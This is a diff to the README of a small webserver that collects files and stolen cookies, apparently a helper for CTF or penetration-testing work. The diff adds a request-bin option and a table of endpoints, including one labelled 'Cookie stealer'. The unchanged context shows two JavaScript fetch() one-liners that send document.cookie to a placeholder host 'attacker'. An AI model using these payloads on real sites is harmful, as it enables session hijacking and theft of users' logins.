@@ -17,7 +17,18 @@ A simple webserver you can send files or cookies to. I wrote it specifically for
 
 -c           activate cookiestealer
 -cl          Output file for cookielog. -c needs to be provided. Default: cookielog.txt
+
+-b           activate request bin
+-bl          Outupt file for request bin. -b needs to be provided. Default: requestlog.txt
 ```
+
+### URLs
+
+| Path | Function |
+| ---- | -------- | 
+| /f   | File upload |
+| /c   | Cookie stealer |
+| /b   | Request bin |
 
 ### Send data
 
@@ -38,6 +49,7 @@ fetch('http://attacker/c', {method: "POST", mode: "no-cors", body: document.cook
 ```js=
 fetch('http://attacker/c?'+document.cookie.trim().replace("; ", "&"), {method: "GET", mode: "no-cors"})
 ```
+
 
 ## Building
 
